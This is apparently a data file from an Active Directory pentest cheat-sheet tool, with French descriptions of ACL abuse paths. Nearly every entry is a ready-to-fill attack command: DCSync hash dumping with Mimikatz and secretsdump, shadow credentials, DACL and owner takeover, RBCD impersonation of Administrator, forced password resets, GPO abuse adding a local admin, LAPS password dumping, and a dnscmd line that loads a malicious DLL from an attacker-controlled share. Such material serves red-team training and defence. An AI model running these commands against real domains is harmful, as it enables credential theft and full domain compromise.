export const ACLS_DATA = [
  {
    name: 'DCSync (Replication Rights)',
    nodes: [
      { 
        label: 'Mimikatz DCSync', 
        cmd: 'mimikatz "lsadump::dcsync /domain:<target_domain> /user:<target_user>" exit', 
        leadsTo: 'Domain Admin Creds',
        description: 'Simule un contrôleur de domaine pour demander la réplication des secrets (hashs NTLM, clés Kerberos) d\'un utilisateur cible. Nécessite les droits DS-Replication-Get-Changes.'
      },
      { 
        label: 'Secretsdump (Impacket)', 
        cmd: 'secretsdump.py <domain>/<user>:<password>@<dc_ip> -just-dc-user <target_user>', 
        leadsTo: 'Domain Admin Creds',
        description: 'Version Python de l\'attaque DCSync. L\'option -just-dc-user permet de cibler un compte spécifique (ex: krbtgt).'
      }
    ]
  },
  {
    name: 'Shadow Credentials (msDS-KeyCredentialLink)',
    nodes: [
      { 
        label: 'Certipy Shadow Auto', 
        cmd: 'certipy shadow auto -u <user>@<domain> -p <password> -account <target_account>', 
        leadsTo: 'NTHash (via PKINIT)',
        description: 'Abuse des droits GenericAll/GenericWrite sur un objet pour injecter une clé publique (KeyCredential) et s\'authentifier en tant que cette cible via PKINIT.'
      },
      { 
        label: 'PyWhisker', 
        cmd: 'pywhisker.py -d <domain> -u <user> -p <password> --target <target_samname> --action "add" --filename "key.pfx"', 
        leadsTo: 'Certificate Auth',
        description: 'Outil spécialisé pour manipuler l\'attribut msDS-KeyCredentialLink et injecter un dispositif "Shadow Credential".'
      }
    ]
  },
  {
    name: 'Owner / WriteDACL',
    nodes: [
      { 
        label: 'Ownered (Change Owner)', 
        cmd: 'ownered.py -u <user> -p <password> -d <domain> --target <target_dn> --new-owner <attacker_sid>', 
        leadsTo: 'Full Control',
        description: 'Si vous avez le droit WriteOwner, prenez la propriété de l\'objet pour ensuite modifier ses ACL (WriteDACL) et vous donner tous les droits.'
      },
      { 
        label: 'Dacled (Grant Rights)', 
        cmd: 'dacled.py -u <user> -p <password> -d <domain> --target <target_dn> --grant <attacker_samname> --rights "GenericAll"', 
        leadsTo: 'GenericAll',
        description: 'Si vous avez WriteDACL, ajoutez une ACE (Access Control Entry) pour accorder le contrôle total (GenericAll) à votre utilisateur.'
      }
    ]
  },
  {
    name: 'RBCD (Resource Based Constrained Delegation)',
    nodes: [
      { 
        label: 'Add Computer (pywiew)', 
        cmd: 'addcomputer.py -u <user> -p <password> -d <domain> -computer-name <fake_pc> -computer-pass <fake_pass>', 
        leadsTo: 'Machine Account',
        description: 'Crée un compte machine contrôlé par l\'attaquant (nécessite un quota MachineAccountQuota > 0).'
      },
      { 
        label: 'RBCD Setup (Impacket)', 
        cmd: 'rbcd.py -delegate-from <fake_pc$> -delegate-to <target_computer$> -action write -u <user> -p <password> -d <domain>', 
        leadsTo: 'Impersonation',
        description: 'Configure l\'attribut msDS-AllowedToActOnBehalfOfOtherIdentity de la cible pour faire confiance au compte machine de l\'attaquant.'
      },
      { 
        label: 'Get Service Ticket', 
        cmd: 'getST.py -spn cifs/<target_computer> -impersonate Administrator -dc-ip <dc_ip> <domain>/<fake_pc$>:<fake_pass>', 
        leadsTo: 'Admin (CIFS)',
        description: 'Demande un ticket de service pour la cible en usurpant l\'administrateur via S4U2Self/S4U2Proxy.'
      }
    ]
  },
  {
    name: 'GenericAll / GenericWrite / ForceChangePassword',
    nodes: [
      { 
        label: 'Force Password Change (net)', 
        cmd: 'net user <target_user> <new_password> /domain', 
        leadsTo: 'User Takeover',
        description: 'Si vous avez GenericAll ou ForceChangePassword sur un utilisateur, vous pouvez réinitialiser son mot de passe sans connaître l\'ancien.'
      },
      { 
        label: 'Targeted Kerberoast', 
        cmd: 'targetedkerberoast.py -d <domain> -u <user> -p <password> --target <target_user>', 
        leadsTo: 'Kerberoastable Hash',
        description: 'Si vous avez GenericWrite sur un utilisateur, ajoutez un SPN à son compte pour le rendre vulnérable au Kerberoasting.'
      }
    ]
  },
  {
    name: 'GPO Abuse',
    nodes: [
      { 
        label: 'PyGPOAbuse', 
        cmd: 'pygpoabuse.py <domain>/<user>:<password> -gpo-id <gpo_guid> -powershell-script "net localgroup Administrators attacker /add"', 
        leadsTo: 'Admin on Joined PCs',
        description: 'Si vous pouvez modifier une GPO, injectez une tâche planifiée ou un script de démarrage malveillant qui s\'exécutera sur toutes les machines appliquant cette GPO.'
      }
    ]
  },
  {
    name: 'LAPS (Read Passwords)',
    nodes: [
      { 
        label: 'Read LAPS Password (Impacket)', 
        cmd: 'Get-LaptADPassword.py -u <user> -p <password> -d <domain> <dc_ip>', 
        leadsTo: 'Local Admin Creds',
        description: 'Si vous avez le droit de lecture sur ms-Mcs-AdmPwd, récupérez le mot de passe administrateur local en clair géré par LAPS.'
      },
      { 
        label: 'CrackMapExec LAPS', 
        cmd: 'nxc ldap <dc_ip> -u <user> -p <password> --module laps', 
        leadsTo: 'Local Admin Creds',
        description: 'Module NetExec pour dumper massivement les mots de passe LAPS lisibles.'
      }
    ]
  },
  {
    name: 'DNSAdmins (DLL Injection)',
    nodes: [
      { 
        label: 'Dnscmd Injection', 
        cmd: 'dnscmd <dc_fqdn> /config /serverlevelplugindll \\\\<attacker_ip>\\share\\malicious.dll', 
        leadsTo: 'Domain Admin',
        description: 'Si vous êtes membre du groupe DnsAdmins, forcez le service DNS du DC à charger une DLL arbitraire (avec privilèges SYSTEM) au redémarrage.'
      }
    ]
  }
];